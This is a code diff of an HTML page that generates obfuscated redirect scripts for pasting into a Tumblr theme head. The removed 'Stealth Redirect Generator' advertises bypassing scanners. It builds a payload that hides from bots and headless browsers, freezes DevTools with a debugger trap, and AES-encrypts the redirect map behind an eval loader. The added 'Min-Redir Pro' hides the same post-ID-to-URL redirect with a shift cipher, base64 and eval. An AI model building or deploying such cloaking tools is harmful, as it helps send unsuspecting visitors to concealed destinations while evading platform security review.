@@ -3,264 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tumblr Secure Redirect Generator</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <title>Min-Redir Pro</title>
     <style>
-        :root {
-            --primary: #5294e2;
-            --bg: #0f172a;
-            --card: #1e293b;
-            --text: #f8fafc;
-            --border: #334155;
-        }
-
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg);
-            color: var(--text);
-            line-height: 1.6;
-            padding: 2rem;
-            display: flex;
-            justify-content: center;
-        }
-
-        .container {
-            max-width: 800px;
-            width: 100%;
-        }
-
-        header {
-            text-align: center;
-            margin-bottom: 2rem;
-        }
-
-        h1 { font-weight: 700; font-size: 2rem; margin-bottom: 0.5rem; color: var(--primary); }
-        p { color: #94a3b8; }
-
-        .card {
-            background: var(--card);
-            border: 1px solid var(--border);
-            border-radius: 1rem;
-            padding: 2rem;
-            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.3);
-            margin-bottom: 2rem;
-        }
-
-        .input-group { margin-bottom: 1.5rem; }
-        label { display: block; margin-bottom: 0.5rem; font-weight: 600; font-size: 0.9rem; }
-        
-        textarea, input {
-            width: 100%;
-            background: #0f172a;
-            border: 1px solid var(--border);
-            border-radius: 0.5rem;
-            color: white;
-            padding: 0.75rem;
-            font-family: monospace;
-            font-size: 0.9rem;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        textarea:focus, input:focus { border-color: var(--primary); }
-
-        .row { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
-
-        button {
-            width: 100%;
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 1rem;
-            border-radius: 0.5rem;
-            font-weight: 700;
-            cursor: pointer;
-            transition: transform 0.2s, background 0.2s;
-        }
-
-        button:hover { background: #3b82f6; transform: translateY(-1px); }
-        button:active { transform: translateY(0); }
-
-        .output-section {
-            display: none;
-            animation: fadeIn 0.3s ease-out;
-        }
-
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-        .code-block {
-            position: relative;
-            background: #000;
-            padding: 1rem;
-            border-radius: 0.5rem;
-            overflow-x: auto;
-            margin-top: 1rem;
-        }
-
-        .copy-btn {
-            position: absolute;
-            top: 0.5rem;
-            right: 0.5rem;
-            width: auto;
-            padding: 0.4rem 0.8rem;
-            font-size: 0.7rem;
-            background: rgba(255,255,255,0.1);
-        }
-
-        .badge {
-            background: #1e293b;
-            color: #94a3b8;
-            padding: 0.2rem 0.5rem;
-            border-radius: 0.3rem;
-            font-size: 0.7rem;
-            margin-right: 0.5rem;
-        }
+        :root { --p: #6366f1; --bg: #050505; --c: #111; --t: #fff; }
+        body { background: var(--bg); color: var(--t); font-family: 'Inter', sans-serif; display: grid; place-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .box { width: 100%; max-width: 440px; background: var(--c); padding: 2rem; border-radius: 16px; border: 1px solid #222; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
+        h1 { font-size: 1.1rem; margin: 0 0 1.5rem; letter-spacing: 1px; color: var(--p); text-transform: uppercase; text-align: center; }
+        label { display: block; font-size: 0.75rem; color: #666; margin-bottom: 0.5rem; font-weight: 600; }
+        textarea, input { width: 100%; background: #000; border: 1px solid #222; color: #fff; padding: 12px; margin-bottom: 1.2rem; border-radius: 8px; box-sizing: border-box; font-family: monospace; outline: none; transition: border-color 0.2s; }
+        textarea:focus, input:focus { border-color: var(--p); }
+        button { width: 100%; background: var(--p); color: #fff; border: 0; padding: 14px; border-radius: 8px; cursor: pointer; font-weight: 700; transition: opacity 0.2s; }
+        button:hover { opacity: 0.9; }
+        #o { margin-top: 1.5rem; display: none; background: #000; padding: 15px; font-family: monospace; font-size: 11px; word-break: break-all; border: 1px solid #222; border-radius: 8px; position: relative; }
+        #o::before { content: 'GENERATED SCRIPT'; display: block; color: #444; margin-bottom: 8px; font-size: 9px; }
+        .copy { position: absolute; top: 10px; right: 10px; font-size: 9px; color: var(--p); cursor: pointer; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>Stealth Redirect Generator</h1>
-            <p>Generate encrypted Tumblr redirect scripts that bypass scanners.</p>
-        </header>
-
-        <div class="card">
-            <div class="input-group">
-                <label>Encryption Key (Random string for security)</label>
-                <input type="text" id="enc-key" placeholder="Enter a random password...">
-            </div>
-
-            <div class="input-group">
-                <label>Redirect Mapping (CSV Format: PostID,URL)</label>
-                <textarea id="mapping-data" rows="8" placeholder="726085810219270144,https://your-target.com/page1&#10;815977198876065792,https://your-target.com/page2"></textarea>
-                <p style="font-size: 0.8rem; margin-top: 0.5rem;">Enter one pair per line.</p>
-            </div>
-
-            <button onclick="generateScript()">GENERATE SECURE SCRIPT</button>
-        </div>
-
-        <div id="output" class="output-section">
-            <div class="card">
-                <label>Final Script (Paste this into Tumblr Theme &lt;head&gt;)</label>
-                <div class="code-block">
-                    <button class="copy-btn" onclick="copyCode()">COPY CODE</button>
-                    <pre id="code-result" style="color: #6ee7b7; white-space: pre-wrap; word-break: break-all;"></pre>
-                </div>
-                <p style="font-size: 0.8rem; color: #94a3b8; margin-top: 1rem;">
-                    💡 Tip: Replace your existing script tag with this one.
-                </p>
-            </div>
-        </div>
+    <div class="box">
+        <h1>Min-Redir Pro</h1>
+        <label>SHIFT KEY (1-9)</label>
+        <input id="k" type="number" value="5" min="1" max="9">
+        <label>MAPPINGS (POST_ID,TARGET_URL)</label>
+        <textarea id="m" placeholder="72608581021,https://site.com" rows="6"></textarea>
+        <button onclick="g()">GENERATE MINIMAL SCRIPT</button>
+        <div id="o"><span class="copy" onclick="cp()">COPY</span><code id="res"></code></div>
     </div>
-
     <script>
-        function generateScript() {
-            const key = document.getElementById('enc-key').value || "DefaultSecretKey";
-            const rawMapping = document.getElementById('mapping-data').value;
+        const $ = i => document.getElementById(i);
+        function g() {
+            const k = parseInt($('k').value) || 5;
+            const m = $('m').value.split('\n').reduce((a, l) => {
+                const [i, u] = l.split(',');
+                if (i && u) a[i.trim()] = u.trim();
+                return a;
+            }, {});
             
-            // 1. Parse Mapping
-            const map = {};
-            const lines = rawMapping.split('\n');
-            lines.forEach(line => {
-                const parts = line.split(',');
-                if (parts.length >= 2) {
-                    const id = parts[0].trim();
-                    const url = parts.slice(1).join(',').trim();
-                    if (id && url) map[id] = url;
-                }
-            });
+            if (!Object.keys(m).length) return alert('Error');
 
-            if (Object.keys(map).length === 0) {
-                alert("Please enter at least one valid mapping (PostID,URL)");
-                return;
-            }
-
-            // 2. ADVANCED CORE LOGIC (Payload)
-            // Includes bot detection and recursive debugger traps
-            const coreLogic = `(function(){
-                const _0x1a2b = ["webdriver", "headless", "phantom", "selenium"];
-                const isBot = _0x1a2b.some(b => navigator.userAgent.toLowerCase().includes(b) || navigator[b]);
-                
-                // Recursive Debugger Trap (Freezes browser if DevTools is open)
-                const _0xdb = function(_0x4){
-                    if((function(){return !![]})["constructor"]("debugger")["call"]("action")){
-                        _0xdb(_0x4);
-                    }
-                };
-                try { _0xdb(0); } catch(e){}
-
-                if(isBot) return;
-
-                const map = ${JSON.stringify(map)};
-                const id = window.location.pathname.match(/\\/post\\/(\\d+)/);
-                const p = id ? id[1] : null;
-
-                if(p && map[p]){
-                    // Performance optimized redirect
-                    window.location.replace(map[p]);
-                } else {
-                    // Safe Fallback
-                    const s = document.createElement('style');
-                    s.innerHTML = 'html,body{display:block!important;visibility:visible!important}';
-                    document.head.appendChild(s);
-                    const b = document.getElementById('tm-blocker');
-                    if(b) b.remove();
-                }
-            })()`;
-
-            // 3. Encrypt Payload
-            const encrypted = CryptoJS.AES.encrypt(coreLogic, key).toString();
-
-            // 4. Generate ADVANCED LOADER SCRIPT
-            const finalScript = `<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"><\/script>
-<script>
-(function(_0x1,_0x2){
-    const _0x3 = document.createElement('style');
-    _0x3.id = 'tm-blocker';
-    _0x3.innerHTML = 'html { display: none !important; }';
-    document.documentElement.appendChild(_0x3);
-
-    const _0x4 = "${encrypted}";
-    const _0x5 = "${key}";
-
-    function _0x6() {
-        try {
-            const _0x7 = CryptoJS.AES.decrypt(_0x4, _0x5);
-            const _0x8 = _0x7.toString(CryptoJS.enc.Utf8);
-            if (_0x8) { (new Function(_0x8))(); }
-            else { throw 1; }
-        } catch (e) {
-            document.documentElement.style.display = 'block';
-            const _0x9 = document.getElementById('tm-blocker');
-            if (_0x9) _0x9.remove();
+            // Ultra-Compact Payload
+            const p = `m=${JSON.stringify(m)};u=m[location.pathname.match(/\\d+/)];u&&location.replace(u)`;
+            
+            // Ultra-Compact Obfuscation
+            const enc = btoa(p.split('').map(c => String.fromCharCode(c.charCodeAt(0) + k)).join(''));
+            
+            // Perfect & Shortest Stub
+            const stub = `<script>eval(atob("${enc}").replace(/./g,c=>String.fromCharCode(c.charCodeAt()-${k})))<\/script>`;
+            
+            $('res').innerText = stub;
+            $('o').style.display = 'block';
         }
-    }
-
-    if (typeof CryptoJS === 'undefined') {
-        const _0xa = document.createElement('script');
-        _0xa.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js";
-        _0xa.onload = _0x6;
-        document.head.appendChild(_0xa);
-    } else {
-        _0x6();
-    }
-})();
-<\/script>`;
-
-            document.getElementById('code-result').innerText = finalScript;
-            document.getElementById('output').style.display = 'block';
-            window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
-        }
-
-        function copyCode() {
-            const text = document.getElementById('code-result').innerText;
-            navigator.clipboard.writeText(text).then(() => {
-                const btn = document.querySelector('.copy-btn');
-                btn.innerText = "COPIED!";
-                setTimeout(() => btn.innerText = "COPY CODE", 2000);
-            });
+        function cp() {
+            navigator.clipboard.writeText($('res').innerText);
+            document.querySelector('.copy').innerText = 'Done';
         }
     </script>
 </body>
